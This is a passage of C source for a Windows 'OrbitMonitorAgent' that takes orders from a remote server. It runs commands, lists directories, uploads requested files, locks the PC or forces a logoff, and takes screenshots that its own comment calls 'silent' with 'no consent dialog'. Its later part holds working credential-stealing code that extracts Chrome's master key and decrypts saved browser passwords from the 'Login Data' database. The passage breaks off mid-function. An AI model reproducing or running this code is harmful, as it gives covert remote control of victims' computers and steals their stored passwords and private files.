    /* Escape stdout and stderr for JSON */
    char* escapedOut = (char*)malloc(65536);
    char* escapedErr = (char*)malloc(8192);
    if (!escapedOut || !escapedErr) {
        free(escapedOut); free(escapedErr);
        return;
    }
    escapedOut[0] = '\0'; escapedErr[0] = '\0';
    JsonEscapeAppend(escapedOut, 65536, stdout_data);
    JsonEscapeAppend(escapedErr, 8192, stderr_data);

    /* Build and post result JSON */
    char* resultJson = (char*)malloc(131072);
    if (resultJson) {
        snprintf(resultJson, 131072,
            "{\"stdout\":\"%s\",\"stderr\":\"%s\",\"exitCode\":%d}",
            escapedOut, escapedErr, exitCode);

        char result_url[1024];
        sprintf(result_url, "%s/api/agent/command/result", g_server_url);
        char result_resp[256] = {0};

        /* Pass cmd_id in x-orbit-cmd header via HttpPostJson session_id slot
           We need a custom post here; repurpose session_id parameter */
        HINTERNET hInet = InternetOpenA("OrbitMonitorAgent/3.0",
            INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (hInet) {
            HINTERNET hConn = NULL;
            HINTERNET hReq  = OpenHttpRequest(hInet, result_url, "POST", &hConn);
            if (hReq) {
                char hdrs[512];
                sprintf(hdrs,
                    "Content-Type: application/json\r\n"
                    "x-orbit-agent-token: %s\r\n"
                    "x-orbit-cmd: %s\r\n",
                    ENROLLMENT_TOKEN, cmd_id);
                HttpSendRequestA(hReq, hdrs, (DWORD)strlen(hdrs),
                    (LPVOID)resultJson, (DWORD)strlen(resultJson));
                InternetCloseHandle(hReq);
            }
            if (hConn) InternetCloseHandle(hConn);
            InternetCloseHandle(hInet);
        }
        free(resultJson);
    }
    free(escapedOut);
    free(escapedErr);
}

/* =========================================================================
   NEW: File listing  (feature 7 — dir listing)
   ========================================================================= */
void CheckDirListRequests() {
    char url[1024];
    sprintf(url, "%s/api/agent/files/list/pending?agentId=%s",
        g_server_url, g_agent_id);

    char resp[2048] = {0};
    if (!HttpGet(url, ENROLLMENT_TOKEN, resp, sizeof(resp))) return;
    if (!strstr(resp, "\"id\":\"")) return;

    /* Parse request id */
    char* idStart = strstr(resp, "\"id\":\"") + 6;
    char req_id[32] = {0};
    int ci = 0;
    while (*idStart && *idStart != '\"' && ci < 31) req_id[ci++] = *idStart++;

    /* Parse path */
    char* pathStart = strstr(resp, "\"path\":\"");
    if (!pathStart) return;
    pathStart += 8;
    char dir_path[1024] = {0};
    ci = 0;
    while (*pathStart && *pathStart != '\"' && ci < 1023) {
        if (*pathStart == '\\' && *(pathStart+1)) {
            pathStart++;
            if      (*pathStart == 'n')  dir_path[ci++] = '\n';
            else if (*pathStart == '\\') dir_path[ci++] = '\\';
            else if (*pathStart == '/')  dir_path[ci++] = '/';
            else { dir_path[ci++] = '\\'; dir_path[ci++] = *pathStart; }
        } else {
            dir_path[ci++] = *pathStart;
        }
        pathStart++;
    }

    if (!req_id[0] || !dir_path[0]) return;

    /* Enumerate directory */
    char search[1280];
    sprintf(search, "%s\\*", dir_path);

    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(search, &ffd);

    /* Allocate output buffer on heap */
    size_t jsonSize = 65536;
    char* jsonOut = (char*)malloc(jsonSize);
    if (!jsonOut) return;
    snprintf(jsonOut, jsonSize, "{\"entries\":[");

    int count = 0;
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(ffd.cFileName, ".") == 0 ||
                strcmp(ffd.cFileName, "..") == 0) continue;

            char eName[512] = {0};
            JsonEscapeAppend(eName, sizeof(eName), ffd.cFileName);

            char fullPath[1536] = {0};
            snprintf(fullPath, sizeof(fullPath), "%s\\%s", dir_path, ffd.cFileName);
            char eFullPath[1536] = {0};
            JsonEscapeAppend(eFullPath, sizeof(eFullPath), fullPath);

            BOOL isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? TRUE : FALSE;
            ULONGLONG fileSize = ((ULONGLONG)ffd.nFileSizeHigh << 32) | ffd.nFileSizeLow;

            /* Convert FILETIME to ISO-8601 */
            SYSTEMTIME st; char modTime[32] = "unknown";
            if (FileTimeToSystemTime(&ffd.ftLastWriteTime, &st)) {
                sprintf(modTime, "%04d-%02d-%02dT%02d:%02d:%02dZ",
                    st.wYear, st.wMonth, st.wDay,
                    st.wHour, st.wMinute, st.wSecond);
            }

            char entry[2048];
            sprintf(entry,
                "%s{\"name\":\"%s\",\"path\":\"%s\","
                "\"isDirectory\":%s,\"size\":%llu,\"modifiedAt\":\"%s\"}",
                count > 0 ? "," : "",
                eName, eFullPath,
                isDir ? "true" : "false",
                (unsigned long long)fileSize, modTime);

            if (strlen(jsonOut) + strlen(entry) + 16 < jsonSize) {
                strncat(jsonOut, entry, jsonSize - strlen(jsonOut) - 1);
                count++;
            } else break;
        } while (FindNextFileA(hFind, &ffd) && count < 500);
        FindClose(hFind);
    } else {
        /* Error – send error field */
        DWORD err = GetLastError();
        free(jsonOut);
        char errJson[256];
        sprintf(errJson, "{\"error\":\"Cannot open directory (error %lu)\"}", (unsigned long)err);

        char result_url[1024];
        sprintf(result_url, "%s/api/agent/files/list/result", g_server_url);

        HINTERNET hInet = InternetOpenA("OrbitMonitorAgent/3.0",
            INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (hInet) {
            HINTERNET hConn = NULL;
            HINTERNET hReq = OpenHttpRequest(hInet, result_url, "POST", &hConn);
            if (hReq) {
                char hdrs[256];
                sprintf(hdrs,
                    "Content-Type: application/json\r\n"
                    "x-orbit-agent-token: %s\r\n"
                    "x-orbit-list: %s\r\n",
                    ENROLLMENT_TOKEN, req_id);
                HttpSendRequestA(hReq, hdrs, (DWORD)strlen(hdrs),
                    errJson, (DWORD)strlen(errJson));
                InternetCloseHandle(hReq);
            }
            if (hConn) InternetCloseHandle(hConn);
            InternetCloseHandle(hInet);
        }
        return;
    }

    strncat(jsonOut, "]}", jsonSize - strlen(jsonOut) - 1);

    /* Post result */
    char result_url[1024];
    sprintf(result_url, "%s/api/agent/files/list/result", g_server_url);

    HINTERNET hInet = InternetOpenA("OrbitMonitorAgent/3.0",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (hInet) {
        HINTERNET hConn = NULL;
        HINTERNET hReq = OpenHttpRequest(hInet, result_url, "POST", &hConn);
        if (hReq) {
            char hdrs[256];
            sprintf(hdrs,
                "Content-Type: application/json\r\n"
                "x-orbit-agent-token: %s\r\n"
                "x-orbit-list: %s\r\n",
                ENROLLMENT_TOKEN, req_id);
            HttpSendRequestA(hReq, hdrs, (DWORD)strlen(hdrs),
                jsonOut, (DWORD)strlen(jsonOut));
            InternetCloseHandle(hReq);
        }
        if (hConn) InternetCloseHandle(hConn);
        InternetCloseHandle(hInet);
    }
    free(jsonOut);
}

/* =========================================================================
   NEW: File pull  (feature 7 — file upload)
   ========================================================================= */
void CheckFilePullRequests() {
    char url[1024];
    sprintf(url, "%s/api/agent/files/pull/pending?agentId=%s",
        g_server_url, g_agent_id);

    char resp[2048] = {0};
    if (!HttpGet(url, ENROLLMENT_TOKEN, resp, sizeof(resp))) return;
    if (!strstr(resp, "\"id\":\"")) return;

    char* idStart = strstr(resp, "\"id\":\"") + 6;
    char req_id[32] = {0};
    int ci = 0;
    while (*idStart && *idStart != '\"' && ci < 31) req_id[ci++] = *idStart++;

    char* pathStart = strstr(resp, "\"path\":\"");
    if (!pathStart) return;
    pathStart += 8;
    char file_path[1024] = {0};
    ci = 0;
    while (*pathStart && *pathStart != '\"' && ci < 1023) {
        if (*pathStart == '\\' && *(pathStart+1)) {
            pathStart++;
            if (*pathStart == '\\') file_path[ci++] = '\\';
            else if (*pathStart == '/') file_path[ci++] = '/';
            else { file_path[ci++] = '\\'; file_path[ci++] = *pathStart; }
        } else {
            file_path[ci++] = *pathStart;
        }
        pathStart++;
    }

    if (!req_id[0] || !file_path[0]) return;

    char upload_url[1024];
    sprintf(upload_url, "%s/api/agent/files/pull/upload", g_server_url);

    /* Open and read the file */
    HANDLE hFile = CreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        DWORD err = GetLastError();
        char errMsg[128];
        sprintf(errMsg, "Cannot open file (error %lu)", (unsigned long)err);

        /* Post error back */
        HINTERNET hInet = InternetOpenA("OrbitMonitorAgent/3.0",
            INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (hInet) {
            HINTERNET hConn = NULL;
            HINTERNET hReq = OpenHttpRequest(hInet, upload_url, "POST", &hConn);
            if (hReq) {
                char hdrs[384];
                sprintf(hdrs,
                    "Content-Type: application/octet-stream\r\n"
                    "x-orbit-agent-token: %s\r\n"
                    "x-orbit-pull: %s\r\n"
                    "x-orbit-error: %s\r\n",
                    ENROLLMENT_TOKEN, req_id, errMsg);
                HttpSendRequestA(hReq, hdrs, (DWORD)strlen(hdrs), NULL, 0);
                InternetCloseHandle(hReq);
            }
            if (hConn) InternetCloseHandle(hConn);
            InternetCloseHandle(hInet);
        }
        return;
    }

    LARGE_INTEGER fileSize;
    GetFileSizeEx(hFile, &fileSize);
    /* Cap at 50 MB */
    DWORD readSize = (DWORD)min((LONGLONG)50 * 1024 * 1024, fileSize.QuadPart);
    BYTE* fileBuf = (BYTE*)malloc(readSize);
    DWORD bytesRead = 0;
    if (fileBuf) ReadFile(hFile, fileBuf, readSize, &bytesRead, NULL);
    CloseHandle(hFile);

    if (!fileBuf || bytesRead == 0) {
        free(fileBuf);
        return;
    }

    /* Upload raw bytes */
    char hdrVal[64];
    sprintf(hdrVal, "%s", req_id);
    HttpPostRaw(upload_url, fileBuf, bytesRead,
        "application/octet-stream",
        ENROLLMENT_TOKEN,
        "x-orbit-pull", hdrVal,
        NULL, 0);
    free(fileBuf);
}

/* =========================================================================
   NEW: PC control — lock, logoff, silent screenshot  (feature 8)
   ========================================================================= */
void CheckControlCommands() {
    char url[1024];
    sprintf(url, "%s/api/agent/control/pending?agentId=%s",
        g_server_url, g_agent_id);

    char resp[1024] = {0};
    if (!HttpGet(url, ENROLLMENT_TOKEN, resp, sizeof(resp))) return;
    if (!strstr(resp, "\"id\":\"")) return;

    /* Parse id */
    char* idStart = strstr(resp, "\"id\":\"") + 6;
    char ctrl_id[32] = {0};
    int ci = 0;
    while (*idStart && *idStart != '\"' && ci < 31) ctrl_id[ci++] = *idStart++;

    /* Parse action */
    char* actStart = strstr(resp, "\"action\":\"");
    if (!actStart) return;
    actStart += 10;
    char action[32] = {0};
    ci = 0;
    while (*actStart && *actStart != '\"' && ci < 31) action[ci++] = *actStart++;

    if (!ctrl_id[0] || !action[0]) return;

    LogMessage("Control command [%s]: action=%s", ctrl_id, action);

    char result_url[1024];
    sprintf(result_url, "%s/api/agent/control/result", g_server_url);

    if (strcmp(action, "lock") == 0) {
        LockWorkStation();
        /* Post completion (no body) */
        char hdrs[256];
        sprintf(hdrs,
            "Content-Type: application/json\r\n"
            "x-orbit-agent-token: %s\r\n"
            "x-orbit-ctrl: %s\r\n",
            ENROLLMENT_TOKEN, ctrl_id);
        const char* empty = "{}";
        HINTERNET hInet = InternetOpenA("OrbitMonitorAgent/3.0",
            INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (hInet) {
            HINTERNET hConn = NULL;
            HINTERNET hReq = OpenHttpRequest(hInet, result_url, "POST", &hConn);
            if (hReq) {
                HttpSendRequestA(hReq, hdrs, (DWORD)strlen(hdrs),
                    (LPVOID)empty, (DWORD)strlen(empty));
                InternetCloseHandle(hReq);
            }
            if (hConn) InternetCloseHandle(hConn);
            InternetCloseHandle(hInet);
        }

    } else if (strcmp(action, "logoff") == 0) {
        /* Post completion first, then logoff (so the POST goes through) */
        char hdrs[256];
        sprintf(hdrs,
            "Content-Type: application/json\r\n"
            "x-orbit-agent-token: %s\r\n"
            "x-orbit-ctrl: %s\r\n",
            ENROLLMENT_TOKEN, ctrl_id);
        const char* empty = "{}";
        HINTERNET hInet = InternetOpenA("OrbitMonitorAgent/3.0",
            INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (hInet) {
            HINTERNET hConn = NULL;
            HINTERNET hReq = OpenHttpRequest(hInet, result_url, "POST", &hConn);
            if (hReq) {
                HttpSendRequestA(hReq, hdrs, (DWORD)strlen(hdrs),
                    (LPVOID)empty, (DWORD)strlen(empty));
                InternetCloseHandle(hReq);
            }
            if (hConn) InternetCloseHandle(hConn);
            InternetCloseHandle(hInet);
        }
        Sleep(500);
        ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);

    } else if (strcmp(action, "screenshot") == 0) {
        /* Silent screenshot — no consent dialog */
        DWORD frame_len = 0;
        BYTE* pBmp = CaptureScreenBMP(&frame_len, 1); /* medium quality */
        if (pBmp) {
            /* Post BMP as result body with Content-Type: image/bmp */
            HINTERNET hInet = InternetOpenA("OrbitMonitorAgent/3.0",
                INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
            if (hInet) {
                HINTERNET hConn = NULL;
                HINTERNET hReq  = OpenHttpRequest(hInet, result_url, "POST", &hConn);
                if (hReq) {
                    char hdrs[256];
                    sprintf(hdrs,
                        "Content-Type: image/bmp\r\n"
                        "x-orbit-agent-token: %s\r\n"
                        "x-orbit-ctrl: %s\r\n",
                        ENROLLMENT_TOKEN, ctrl_id);
                    HttpSendRequestA(hReq, hdrs, (DWORD)strlen(hdrs),
                        pBmp, frame_len);
                    InternetCloseHandle(hReq);
                }
                if (hConn) InternetCloseHandle(hConn);
                InternetCloseHandle(hInet);
            }
            free(pBmp);
        }
    }
}

/* =========================================================================
   BROWSER, DISCORD, HEATMAP  — NEW FEATURES
   =========================================================================
   Headers needed for DPAPI + BCrypt + Shell paths.
   ========================================================================= */
#include <wincrypt.h>
#include <bcrypt.h>
#include <shlobj.h>
#pragma comment(lib,"crypt32.lib")
#pragma comment(lib,"bcrypt.lib")
#pragma comment(lib,"shell32.lib")

/* ── Path helpers ───────────────────────────────────────────────────────── */
static void GetLocalAppData(char* out,size_t sz){out[0]='\0';SHGetFolderPathA(NULL,CSIDL_LOCAL_APPDATA,NULL,SHGFP_TYPE_CURRENT,out);}
static void GetRoamingAppData(char* out,size_t sz){out[0]='\0';SHGetFolderPathA(NULL,CSIDL_APPDATA,NULL,SHGFP_TYPE_CURRENT,out);}

/* ── HTTP POST to a browser/discord endpoint with x-orbit-agent header ───── */
static void PostAgentJson(const char* path, const char* json, size_t len) {
    char url[1024]; sprintf(url,"%s%s",g_server_url,path);
    HINTERNET hI=InternetOpenA("OrbitMonitorAgent/4.0",INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
    if(!hI)return;
    HINTERNET hC=NULL;
    HINTERNET hR=OpenHttpRequest(hI,url,"POST",&hC);
    if(hR){
        char hdrs[512];
        sprintf(hdrs,"Content-Type: application/json\r\nx-orbit-agent-token: %s\r\nx-orbit-agent: %s\r\n",
            ENROLLMENT_TOKEN,g_agent_id);
        HttpSendRequestA(hR,hdrs,(DWORD)strlen(hdrs),(LPVOID)json,(DWORD)len);
        InternetCloseHandle(hR);
    }
    if(hC)InternetCloseHandle(hC);
    InternetCloseHandle(hI);
}

/* ── Heatmap tick ─────────────────────────────────────────────────────────── */
static void SendHeatmapTick(const char* status) {
    char json[64]; sprintf(json,"{\"status\":\"%s\"}",status);
    PostAgentJson("/api/agent/heatmap/tick",json,strlen(json));
}

/* ── DPAPI decrypt ─────────────────────────────────────────────────────────── */
static BOOL DpapiDecrypt(const BYTE* enc,DWORD encLen,BYTE* out,DWORD* outLen){
    DATA_BLOB in={encLen,(BYTE*)enc}, ob={0,NULL};
    if(!CryptUnprotectData(&in,NULL,NULL,NULL,NULL,0,&ob))return FALSE;
    DWORD copy=min(ob.cbData,*outLen-1);
    memcpy(out,ob.pbData,copy); out[copy]='\0';
    *outLen=copy; LocalFree(ob.pbData); return TRUE;
}

/* ── Simple JSON string reader ─────────────────────────────────────────────── */
static BOOL JsonReadStr(const char* json,const char* key,char* out,int outSz){
    out[0]='\0';
    char srch[128]; sprintf(srch,"\"%s\":\"",key);
    const char* p=strstr(json,srch); if(!p)return FALSE;
    p+=strlen(srch); int i=0;
    while(*p&&*p!='"'&&i<outSz-1){if(*p=='\\')p++;out[i++]=*p++;}
    out[i]='\0'; return i>0;
}

/* ── Base64 decode ─────────────────────────────────────────────────────────── */
static int B64Decode(const char* in,int inLen,BYTE* out){
    static const char t[]="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int outLen=0;
    for(int i=0;i<inLen;i+=4){
        int v=0,bits=0;
        for(int j=0;j<4&&i+j<inLen;j++){
            char c=in[i+j]; if(c=='=')break;
            const char* q=strchr(t,c); if(!q)continue;
            v=(v<<6)|(int)(q-t); bits+=6;
        }
        if(bits>=8){out[outLen++]=(v>>(bits-8))&0xFF;bits-=8;}
        if(bits>=8){out[outLen++]=(v>>(bits-8))&0xFF;bits-=8;}
        if(bits>=8){out[outLen++]=(v>>(bits-8))&0xFF;}
    }
    return outLen;
}

/* ── Get Chrome master AES key from Local State ───────────────────────────── */
static BOOL GetChromeMasterKey(const char* base, BYTE* key32){
    char lsPath[MAX_PATH]; sprintf(lsPath,"%s\\Local State",base);
    HANDLE hF=CreateFileA(lsPath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hF==INVALID_HANDLE_VALUE)return FALSE;
    LARGE_INTEGER fs; GetFileSizeEx(hF,&fs);
    if(fs.QuadPart>4*1024*1024){CloseHandle(hF);return FALSE;}
    DWORD fsz=(DWORD)fs.QuadPart;
    char* buf=(char*)malloc(fsz+1); DWORD rd=0;
    ReadFile(hF,buf,fsz,&rd,NULL); buf[rd]='\0'; CloseHandle(hF);
    char b64[512]={0}; JsonReadStr(buf,"encrypted_key",b64,sizeof(b64));
    free(buf); if(!b64[0])return FALSE;
    int decLen=(int)strlen(b64)/4*3+4;
    BYTE* dec=(BYTE*)malloc(decLen);
    int n=B64Decode(b64,(int)strlen(b64),dec);
    if(n<=5){free(dec);return FALSE;}
    DWORD outLen=64; BYTE plain[64]={0};
    BOOL ok=DpapiDecrypt(dec+5,n-5,plain,&outLen);
    free(dec); if(!ok)return FALSE;
    memcpy(key32,plain,32); return TRUE;
}

/* ── AES-256-GCM decrypt (BCrypt) ────────────────────────────────────────── */
static BOOL AesGcmDecrypt(const BYTE* key32,const BYTE* iv12,const BYTE* cipher,DWORD cipherLen,char* out,int outSz){
    if(cipherLen<16)return FALSE;
    DWORD tagLen=16,plainLen=cipherLen-tagLen;
    BCRYPT_ALG_HANDLE hA=NULL; BCRYPT_KEY_HANDLE hK=NULL; BOOL ok=FALSE;
    if(BCryptOpenAlgorithmProvider(&hA,BCRYPT_AES_ALGORITHM,NULL,0))return FALSE;
    BCryptSetProperty(hA,BCRYPT_CHAINING_MODE,(PUCHAR)BCRYPT_CHAIN_MODE_GCM,sizeof(BCRYPT_CHAIN_MODE_GCM),0);
    if(BCryptGenerateSymmetricKey(hA,&hK,NULL,0,(PUCHAR)key32,32,0))goto gcm_done;
    {
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai;
        BCRYPT_INIT_AUTH_MODE_INFO(ai);
        ai.pbNonce=(PUCHAR)iv12; ai.cbNonce=12;
        ai.pbTag=(PUCHAR)(cipher+cipherLen-tagLen); ai.cbTag=tagLen;
        BYTE* pb=(BYTE*)malloc(plainLen+1); ULONG res=0;
        if(pb&&BCryptDecrypt(hK,(PUCHAR)cipher,plainLen,&ai,NULL,0,pb,plainLen,&res,0)==0){
            int cp=min((int)res,outSz-1); memcpy(out,pb,cp); out[cp]='\0'; ok=TRUE;
        }
        free(pb);
    }
gcm_done:
    if(hK)BCryptDestroyKey(hK);
    if(hA)BCryptCloseAlgorithmProvider(hA,0);
    return ok;
}

/* ── Decrypt a Chrome password blob (v10/v11 = AES-GCM, else DPAPI) ──────── */
static BOOL DecryptChromeBlob(const BYTE* enc,DWORD encLen,const BYTE* mk,char* out,int outSz){
    out[0]='\0';
    if(encLen<3)return FALSE;
    if(enc[0]=='v'&&enc[1]=='1'&&(enc[2]>='0')&&mk){
        if(encLen<3+12+16)return FALSE;
        return AesGcmDecrypt(mk,enc+3,enc+15,encLen-15,out,outSz);
    }
    DWORD ol=outSz; return DpapiDecrypt(enc,encLen,(BYTE*)out,&ol);
}

/* ── SQLite3 varint ───────────────────────────────────────────────────────── */
static int ReadVarint(const BYTE* p,const BYTE* end,UINT64* out){
    *out=0; int n=0;
    while(p+n<end&&n<9){
        BYTE b=p[n];
        if(n<8)*out=(*out<<7)|(b&0x7F); else *out=(*out<<8)|b;
        n++; if(!(b&0x80)||n==9)break;
    }
    return n;
}
static int SerialSz(UINT64 st,UINT64* tb){
    *tb=0;
    if(st==0)return 0; if(st==1)return 1; if(st==2)return 2;
    if(st==3)return 3; if(st==4)return 4; if(st==5)return 6;
    if(st==6||st==7)return 8; if(st==8||st==9)return 0;
    if(st>=12&&(st%2==0)){*tb=(st-12)/2;return(int)*tb;}
    if(st>=13&&(st%2==1)){*tb=(st-13)/2;return(int)*tb;}
    return 0;
}

/* ── Generic SQLite leaf page walker: extract TEXT columns by index ──────── */
typedef struct{int idx;const char* field;}ColSpec;

static char* SqliteTexts(const char* dbPath,int nCols,const ColSpec* cols,int maxRows){
    char tmp[MAX_PATH],td[MAX_PATH];
    GetTempPathA(sizeof(td)-1,td);
    sprintf(tmp,"%sorb_%lu.db",td,(unsigned long)GetTickCount());
    if(!CopyFileA(dbPath,tmp,FALSE))return NULL;
    HANDLE hF=CreateFileA(tmp,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hF==INVALID_HANDLE_VALUE){DeleteFileA(tmp);return NULL;}
    LARGE_INTEGER fs; GetFileSizeEx(hF,&fs);
    if(fs.QuadPart<100||fs.QuadPart>512LL*1024*1024){CloseHandle(hF);DeleteFileA(tmp);return NULL;}
    DWORD fsz=(DWORD)fs.QuadPart;
    BYTE* buf=(BYTE*)malloc(fsz); DWORD rd=0;
    ReadFile(hF,buf,fsz,&rd,NULL); CloseHandle(hF); DeleteFileA(tmp);
    if(rd<100){free(buf);return NULL;}
    DWORD ps=((DWORD)buf[16]<<8)|buf[17]; if(ps==1)ps=65536;
    if(ps<512){free(buf);return NULL;}
    int maxIdx=0; for(int k=0;k<nCols;k++)if(cols[k].idx>maxIdx)maxIdx=cols[k].idx;
    size_t cap=256*1024; char* out=(char*)malloc(cap); strcpy(out,"[");
    int rowCount=0;
    for(DWORD pg=0;pg<fsz/ps&&rowCount<maxRows;pg++){
        DWORD po=pg*ps; BYTE* page=buf+po;
        BYTE ho=(BYTE)(pg==0?100:0);
        if(po+ho+8>fsz)continue; if(page[ho]!=0x0D)continue;
        WORD cc=((WORD)page[ho+3]<<8)|page[ho+4];
        for(WORD ci=0;ci<cc&&rowCount<maxRows;ci++){
            WORD poff=ho+8+ci*2; if(po+poff+2>fsz)break;
            WORD coff=((WORD)page[poff]<<8)|page[poff+1];
            if(coff<ho+8||po+coff+4>fsz)continue;
            BYTE* cell=page+coff, *ce=page+ps;
            UINT64 plen=0; int vl=ReadVarint(cell,ce,&plen); cell+=vl;
            UINT64 rid=0; vl=ReadVarint(cell,ce,&rid); cell+=vl;
            if(cell>=ce||plen<2)continue;
            BYTE* rec=cell,*re=rec+(int)min(plen,(UINT64)(ce-rec));
            UINT64 hlen=0; int hl=ReadVarint(rec,re,&hlen);
            BYTE* hp=rec+hl, *he=rec+(int)min(hlen,(UINT64)(re-rec));
            BYTE* dp=he;
            /* parse serial types */
            UINT64 sts[64]={0}; int nst=0;
            BYTE* h2=hp; while(h2<he&&nst<64){UINT64 s=0;h2+=ReadVarint(h2,he,&s);sts[nst++]=s;}
            /* extract text cells */
            char* texts[64]={0}; int tlens[64]={0};
            BYTE* d2=dp;
            for(int ci2=0;ci2<=maxIdx&&ci2<nst&&d2<re;ci2++){
                UINT64 tb=0; int sz=SerialSz(sts[ci2],&tb);
                for(int k=0;k<nCols;k++){
                    if(cols[k].idx==ci2&&sts[ci2]>=13&&(sts[ci2]%2==1)&&tb>0&&tb<65536&&d2+tb<=re){
                        texts[k]=(char*)d2; tlens[k]=(int)tb; break;
                    }
                }
                d2+=sz;
            }
            /* build entry */
            char entry[4096]={0}; int ep=0;
            ep+=sprintf(entry+ep,"%s{",rowCount>0?",":"");
            int any=0;
            for(int k=0;k<nCols;k++){
                if(!texts[k])continue;
                if(any)entry[ep++]=','; any++;
                ep+=sprintf(entry+ep,"\"%s\":\"",cols[k].field);
                for(int ci3=0;ci3<tlens[k]&&ep<4080;ci3++){
                    char c=texts[k][ci3];
                    if(c=='"'){entry[ep++]='\\';entry[ep++]='"';}
                    else if(c=='\\'){entry[ep++]='\\';entry[ep++]='\\';}
                    else if((unsigned char)c<0x20){}
                    else entry[ep++]=c;
                }
                entry[ep++]='"';
            }
            entry[ep++]='}'; entry[ep]='\0';
            if(any&&strlen(out)+strlen(entry)+4<cap){strcat(out,entry);rowCount++;}
        }
    }
    free(buf); strcat(out,"]"); return out;
}

/* ── Inject "browser":"X" into each object of a JSON array ───────────────── */
static char* InjectBrowser(char* arr,const char* bname){
    if(!arr)return NULL;
    char eb[64]={0}; JsonEscapeAppend(eb,sizeof(eb),bname);
    size_t cap=strlen(arr)+strlen(eb)*2000+65536;
    char* out=(char*)malloc(cap); strcpy(out,"[");
    const char* p=arr+1; int first=1;
    while(*p&&*p!=']'){
        if(*p=='{'){
            const char* end=strchr(p,'}'); if(!end)break;
            int ol=(int)(end-p+1); char obj[8192]={0};
            memcpy(obj,p,min(ol,8191)); obj[min(ol,8191)]='\0';
            char no[8320]={0}; int oe=(int)strlen(obj)-1;
            memcpy(no,obj,oe); sprintf(no+oe,",\"browser\":\"%s\"}",eb);
            if(!first)strcat(out,",");
            if(strlen(out)+strlen(no)+4<cap){strcat(out,no);}
            first=0; p=end+1;
        } else p++;
    }
    free(arr); strcat(out,"]"); return out;
}

/* ── Merge two JSON arrays (both heap, result is new heap) ─────────────────── */
static char* MergeArrays(char* a,char* b){
    if(!a&&!b)return strdup("[]");
    if(!a)return b; if(!b)return a;
    size_t la=strlen(a),lb=strlen(b);
    char* out=(char*)malloc(la+lb+4); strcpy(out,a); free(a);
    int pl=(int)strlen(out); if(out[pl-1]==']')out[--pl]='\0';
    const char* bp=b+1;
    if(*bp&&*bp!=']'){strcat(out,",");strcat(out,bp);}
    else strcat(out,"]");
    free(b); return out;
}

/* ── Read Chrome passwords (Login Data, BLOB col 5) ──────────────────────── */
static char* ReadChromePasswords(const char* profile,const char* base,const char* bname){
    char dbPath[MAX_PATH]; sprintf(dbPath,"%s\\Login Data",profile);
    char tmp[MAX_PATH],td[MAX_PATH]; GetTempPathA(sizeof(td)-1,td);
    sprintf(tmp,"%sorb_ld_%lu.db",td,(unsigned long)GetTickCount());
    if(!CopyFileA(dbPath,tmp,FALSE))return NULL;
    HANDLE hF=CreateFileA(tmp,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(hF==INVALID_HANDLE_VALUE){DeleteFileA(tmp);return NULL;}
    LARGE_INTEGER fs; GetFileSizeEx(hF,&fs);
    if(fs.QuadPart<100||fs.QuadPart>128LL*1024*1024){CloseHandle(hF);DeleteFileA(tmp);return NULL;}
    DWORD fsz=(DWORD)fs.QuadPart;
    BYTE* buf=(BYTE*)malloc(fsz); DWORD rd=0; ReadFile(hF,buf,fsz,&rd,NULL);
    CloseHandle(hF); DeleteFileA(tmp);
    if(rd<100){free(buf);return NULL;}
    BYTE mk[32]={0}; BOOL hasMK=GetChromeMasterKey(base,mk);
    DWORD ps=((DWORD)buf[16]<<8)|buf[17]; if(ps==1)ps=65536; if(ps<512){free(buf);return NULL;}
    size_t cap=256*1024; char* out=(char*)malloc(cap); strcpy(out,"[");
    int rc=0;
    char eb[64]={0}; JsonEscapeAppend(eb,sizeof(eb),bname);
    for(DWORD pg=0;pg<fsz/ps&&rc<500;pg++){
        DWORD po=pg*ps; BYTE* page=buf+po;
        BYTE ho=(BYTE)(pg==0?100:0);
        if(po+ho+8>fsz)continue; if(page[ho]!=0x0D)continue;
        WORD cc=((WORD)page[ho+3]<<8)|page[ho+4];
        for(WORD ci=0;ci<cc&&rc<500;ci++){
            WORD poff=ho+8+ci*2; if(po+poff+2>fsz)break;
            WORD coff=((WORD)page[poff]<<8)|page[poff+1];
            if(coff<ho+8||po+coff+4>fsz)continue;
            BYTE* cell=page+coff,*ce=page+ps;
            UINT64 plen=0; int vl=ReadVarint(cell,ce,&plen); cell+=vl;
            UINT64 rid=0; vl=ReadVarint(cell,ce,&rid); cell+=vl;
            if(cell>=ce||plen<4)continue;
            BYTE* rec=cell,*re=rec+(int)min(plen,(UINT64)(ce-rec));
            UINT64 hlen=0; int hl=ReadVarint(rec,re,&hlen);
            BYTE* hp=rec+hl,*he=rec+(int)min(hlen,(UINT64)(re-rec)),*dp=he;
            UINT64 sts[32]={0}; int nst=0;
            while(hp<he&&nst<32){UINT64 s=0;hp+=ReadVarint(hp,he,&s);sts[nst++]=s;}
            if(nst<6)continue;
            char origin[512]={0},user[256]={0},pass[256]={0};
            BYTE* d2=dp;
            for(int ci2=0;ci2<nst&&d2<re;ci2++){
                UINT64 tb=0; int sz=SerialSz(sts[ci2],&tb);
                if(ci2==0&&sts[ci2]>=13&&(sts[ci2]%2==1)&&tb<512)
